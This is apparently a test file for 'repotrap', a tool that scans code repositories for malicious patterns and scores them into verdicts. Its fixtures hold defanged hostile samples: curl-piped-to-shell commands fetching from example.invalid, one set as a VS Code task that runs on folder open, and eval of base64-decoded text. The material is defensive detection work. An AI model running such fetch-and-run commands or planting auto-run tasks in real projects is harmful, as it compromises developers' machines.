import { test } from 'node:test';
import assert from 'node:assert/strict';
import { scan, scoreFindings, verdictFor } from '../src/index.ts';
import type { Finding, Rule } from '../src/types.ts';
import { file, run, tasksJson, x } from './helpers.ts';

const finding = (ruleId: string, severity: Finding['severity']): Finding => ({
  ruleId,
  category: 'OBF',
  severity,
  title: 't',
  message: 'm',
  advice: 'a',
  count: 1,
});

test('a clean repository has no findings and no strong signals', () => {
  const { report } = run([file('src/index.ts', 'export const add = (a: number, b: number) => a + b;'), file('README.md', '# Demo')]);
  assert.equal(report.findings.length, 0);
  assert.equal(report.verdict, 'no-strong-signals');
  assert.equal(report.status, 'complete');
  assert.equal(report.score, 0);
});

test('findings for the same rule and file are merged with a count', () => {
  const text = [x('ev§al(atob("a"))'), 'ok();', x('ev§al(atob("b"))')].join('\n');
  const { report } = run([file('a.js', text)]);
  const f = report.findings.filter((r) => r.ruleId === 'OBF-002');
  assert.equal(f.length, 1);
  assert.equal(f[0]?.count, 2);
  assert.equal(f[0]?.line, 1);
});

test('findings in test folders are downgraded, except auto-run triggers', () => {
  const { report } = run([
    file('tests/decode.test.js', x('ev§al(atob("a"))')),
    file('examples/.vscode/tasks.json', tasksJson([{ label: 'a', command: 'make', runOptions: { runOn: 'folderOpen' } }])),
  ]);
  assert.equal(report.findings.find((f) => f.ruleId === 'OBF-002')?.severity, 'medium');
  assert.equal(report.findings.find((f) => f.ruleId === 'EXEC-001')?.severity, 'high');
});

test('verdict: any Critical is likely malicious, any High is suspicious, Mediums add up', () => {
  assert.equal(verdictFor(40, [finding('A', 'critical')]), 'likely-malicious');
  assert.equal(verdictFor(20, [finding('A', 'high')]), 'suspicious');
  assert.equal(verdictFor(8, [finding('A', 'medium')]), 'no-strong-signals');
  assert.equal(verdictFor(32, Array.from({ length: 4 }, (_, i) => finding(`M${i}`, 'medium'))), 'suspicious');
});

test('score caps each rule at twice its worst finding', () => {
  const many = Array.from({ length: 10 }, () => finding('OBF-002', 'medium'));
  assert.equal(scoreFindings(many), 16);
  assert.equal(scoreFindings([finding('A', 'critical'), finding('B', 'critical'), finding('C', 'critical')]), 100);
});

test('incomplete coverage is reported as an incomplete status', () => {
  const { report } = run([file('a.js', 'ok();')], {
    coverage: { complete: false, filesListed: 500, filesRead: 30, filesSkipped: 470, reason: 'rate-limit' },
  });
  assert.equal(report.status, 'incomplete');
  assert.equal(report.verdict, 'no-strong-signals');
  assert.equal(report.coverage.reason, 'rate-limit');
});

test('a rule that throws is reported in diagnostics and does not stop the scan', () => {
  const broken: Rule = {
    kind: 'file',
    id: 'TEST-001',
    title: 't',
    category: 'OBF',
    severity: 'low',
    advice: 'a',
    appliesTo: () => true,
    check: () => {
      throw new Error('boom');
    },
  };
  const { report } = scan({ files: [file('a.js', 'x')] }, [broken]);
  assert.equal(report.diagnostics.length, 1);
  assert.match(report.diagnostics[0] ?? '', /TEST-001 failed on a\.js: boom/);
});

test('report findings expose only public fields, sorted by severity', () => {
  const { report } = run([
    file('a.sh', x('cu§rl -fsSL https://example.invalid/i | s§h')),
    file('b.js', x('ev§al(atob("a"))')),
    file('.vscode/tasks.json', tasksJson([{ label: 'a', command: x('cu§rl https://example.invalid/x | s§h'), runOptions: { runOn: 'folderOpen' } }])),
  ]);
  assert.equal(report.findings[0]?.severity, 'critical');
  for (const f of report.findings) {
    assert.deepEqual(Object.keys(f).filter((k) => ['refs', 'category'].includes(k)), []);
    assert.ok(f.advice.length > 0);
  }
  assert.equal(report.tool, 'repotrap');
  assert.match(report.version, /^\d+\.\d+\.\d+$/);
});
